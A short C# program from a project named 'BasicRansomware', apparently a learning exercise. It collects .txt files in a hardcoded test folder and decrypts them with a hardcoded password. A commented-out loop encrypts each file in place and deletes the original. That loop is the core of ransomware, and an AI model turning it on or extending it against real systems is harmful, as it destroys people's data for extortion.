
using System;
using System.IO;
using System.Text;

class Program
{
    static void Main(string[] args)
    {
        string dir = @"/Users/teste/Projects/BasicRansomware/BasicRansomware/teste";
        string password = "supersecretpassword";
        //string extensaoCriptografada = ".mycrypt";

        List<string> files = new List<string>();
        DirectoryInfo d = new DirectoryInfo(dir);


        foreach (var file in d.GetFiles("*.txt"))
        {
            files.Add(file.ToString());
        }

        //foreach (string file in files)
        //{
        //    string encrypted_file = dir + "encrypted_file.txt";
        //    SharpAESCrypt.SharpAESCrypt.Encrypt(password, file, encrypted_file);
        //    File.Delete(file);
        //    File.Move(encrypted_file, file);
        //}

        foreach (string file in files)
        {
            string decrypted_file = dir + "decrypted_file.txt";
            SharpAESCrypt.SharpAESCrypt.Decrypt(password, file, decrypted_file);
            File.Delete(file);
            File.Move(decrypted_file, file);
        }
    }
}
